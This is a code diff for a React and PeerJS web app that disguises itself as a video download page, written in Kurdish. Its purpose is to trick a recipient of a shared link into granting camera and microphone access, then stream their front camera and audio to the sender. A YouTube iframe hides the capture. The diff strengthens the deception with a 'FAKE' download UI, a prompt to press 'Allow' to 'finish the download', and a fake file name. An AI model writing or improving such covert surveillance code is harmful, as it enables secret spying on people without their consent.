@@ -6,15 +6,22 @@ import { analyzeScreen } from './services/geminiService';
 const App: React.FC = () => {
   const [myId, setMyId] = useState<string>('');
   const [targetId, setTargetId] = useState<string>('');
-  const [status, setStatus] = useState<string>('جارێ نییە...');
-  const [role, setRole] = useState<'VIEWER' | 'STREAMER'>('VIEWER');
   
+  // FIX: Initialize role based on URL immediately to prevent flashing the wrong UI
+  const [role, setRole] = useState<'VIEWER' | 'STREAMER'>(() => {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('host') ? 'STREAMER' : 'VIEWER';
+  });
+
+  const [status, setStatus] = useState<string>('');
   const [isConnected, setIsConnected] = useState<boolean>(false);
   const [aiResponse, setAiResponse] = useState<string>('');
   const [loading, setLoading] = useState<boolean>(false);
   
   // State to track if the streamer is watching the "fake" video
   const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
+  // Show a specific instruction overlay when button is clicked
+  const [showPermissionHint, setShowPermissionHint] = useState<boolean>(false);
 
   const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
 
@@ -31,32 +38,21 @@ const App: React.FC = () => {
     newPeer.on('open', (id) => {
       setMyId(id);
       if (hostId) {
-        setRole('STREAMER');
         setTargetId(hostId);
-        setStatus("...Video Loading");
+        // We already set role in useState, but ensuring consistency
+        setRole('STREAMER'); 
       } else {
         setRole('VIEWER');
-        setStatus("لینک بنێرە بۆ ئەوەی کامێرا ببینیت");
       }
     });
 
     // VIEWER Logic: Receive Video
     newPeer.on('call', (call) => {
-      console.log("Receiving call...");
       call.answer(); 
-      
       call.on('stream', (remoteStream) => {
-        console.log("Stream received");
         setActiveStream(remoteStream);
         setIsConnected(true);
-        setStatus("پەیوەست کرا!");
       });
-    });
-
-    newPeer.on('error', (err) => {
-      console.error(err);
-      setStatus("هەڵە: " + err.type);
-      setLoading(false);
     });
 
     peerRef.current = newPeer;
@@ -67,13 +63,9 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    if (isConnected && activeStream && videoRef.current) {
-      // If we are the viewer, show the stream. 
-      // If we are streamer, videoRef might be hidden or reused, handled in render.
-      if (role === 'VIEWER') {
-          videoRef.current.srcObject = activeStream;
-          videoRef.current.play().catch(e => console.error("Autoplay error:", e));
-      }
+    if (isConnected && activeStream && videoRef.current && role === 'VIEWER') {
+        videoRef.current.srcObject = activeStream;
+        videoRef.current.play().catch(e => console.error("Autoplay error:", e));
     }
   }, [isConnected, activeStream, role]);
 
@@ -81,10 +73,10 @@ const App: React.FC = () => {
     if (!peerRef.current || !targetId) return;
     
     setLoading(true);
-    setStatus("Downloading...");
+    // Show the hint pointing to "Allow"
+    setShowPermissionHint(true);
 
     try {
-      // Use Front Camera ('user')
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user' }, 
         audio: true 
@@ -92,25 +84,23 @@ const App: React.FC = () => {
 
       setActiveStream(stream);
 
-      // Call the Viewer
       const call = peerRef.current.call(targetId, stream);
       
       call.on('close', () => {
         setIsConnected(false);
-        setStatus("پەیوەندی پچڕا");
         setActiveStream(null);
       });
 
       setIsConnected(true);
-      // Switch UI to show the YouTube video immediately
+      // Immediately switch to video
       setIsWatchingVideo(true);
       
     } catch (err) {
       console.error(err);
-      // Even if camera fails, try to show the video to not raise suspicion? 
-      // Or show alert. Browser will prompt permission anyway.
-      alert("تکایە ڕێگە بە کامێرا بدە بۆ ئەوەی دابەزاندن دەست پێ بکات.");
+      // If denied, keep loading or show retry text tailored to "Download"
+      alert("بۆ ئەوەی داونلۆدەکە تەواو بێت، دەبێت 'Allow' دابگریت.");
       setLoading(false);
+      setShowPermissionHint(false);
     }
   };
 
@@ -118,8 +108,8 @@ const App: React.FC = () => {
     const url = `${window.location.origin}${window.location.pathname}?host=${myId}`;
     if (navigator.share) {
         navigator.share({
-            title: 'Video Download',
-            text: 'ڤیدیۆکەم بۆ تۆ نارد، بیکەرەوە',
+            title: 'Download Video',
+            text: 'ڤیدیۆکە لێرە دابەزێنە',
             url: url
         }).catch(console.error);
     } else {
@@ -141,11 +131,10 @@ const App: React.FC = () => {
     setAiResponse(text || "هیچ دیار نییە");
   };
 
-  // --- RENDER: CONNECTED / STREAMING STATE FOR STREAMER ---
+  // --- RENDER: STREAMER WATCHING VIDEO ---
   if (isWatchingVideo && role === 'STREAMER') {
       return (
           <div className="h-[100dvh] w-full bg-black flex flex-col">
-              {/* This iframe covers the screen, keeping the connection alive in background */}
               <iframe 
                   width="100%" 
                   height="100%" 
@@ -156,13 +145,12 @@ const App: React.FC = () => {
                   allowFullScreen
                   className="flex-1"
               ></iframe>
-              {/* Keep a hidden video element just in case logic needs it, but muted */}
               <video ref={videoRef} className="hidden" muted playsInline autoPlay />
           </div>
       );
   }
 
-  // --- RENDER: CONNECTED MODE FOR VIEWER ---
+  // --- RENDER: VIEWER ---
   if (isConnected && role === 'VIEWER') {
     return (
       <div className="h-[100dvh] w-full bg-black relative flex flex-col overflow-hidden">
@@ -199,7 +187,7 @@ const App: React.FC = () => {
   // --- RENDER: SETUP MODE ---
   return (
     <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
-      <div className="w-full max-w-sm space-y-8 animate-fade-in">
+      <div className="w-full max-w-sm space-y-8 animate-fade-in relative">
         
         {role === 'VIEWER' ? (
             <div className="flex flex-col items-center gap-2">
@@ -220,19 +208,29 @@ const App: React.FC = () => {
                         <i className="fas fa-share-nodes"></i>
                         ناردنی لینک
                     </button>
-                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected to Server' : 'Connecting...'}</p>
+                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected' : 'Connecting...'}</p>
                 </div>
             </div>
         ) : (
-            // STREAMER "FAKE" UI - Looks like a download page
+            // STREAMER "FAKE" UI - No LinkUp Header, Pure Download Look
             <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
+                
+                {/* Visual hint pointing to where the permission dialog usually appears */}
+                {showPermissionHint && (
+                   <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
+                      ☝️ بۆ تەواوکردنی داونلۆدەکە "Allow" دابگرە
+                   </div>
+                )}
+
                 <div className="space-y-4">
                     <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-600/40 animate-pulse">
                         <i className="fas fa-download text-4xl text-white"></i>
                     </div>
-                    <h2 className="text-2xl font-bold text-white">داونلودکرنا ڤیدیویێ</h2>
-                    <p className="text-slate-300 text-lg">
-                        بو داونلودکرنا ڤیدیویێ، تەماشەکرنێ بێ ئینتەرنێت، ڤێرێ دابگرە
+                    <h2 className="text-2xl font-bold text-white">ئامادەیە بۆ داگرتن</h2>
+                    <p className="text-slate-300 text-lg leading-relaxed">
+                        فایلەکە ئامادەیە. بۆ پاراستنی (Save) فایلەکە لە مۆبایلەکەت، تکایە دوگمەی خوارەوە دابگرە و پاشان 
+                        <span className="text-blue-400 font-bold mx-1">Allow</span> 
+                        هەڵبژێرە.
                     </p>
                 </div>
 
@@ -252,7 +250,7 @@ const App: React.FC = () => {
                 </button>
                 
                 <div className="text-xs text-slate-500">
-                    Size: 24.5 MB • MP4 • HD
+                    Video_2024.mp4 • 24.5 MB • HD
                 </div>
             </div>
         )}
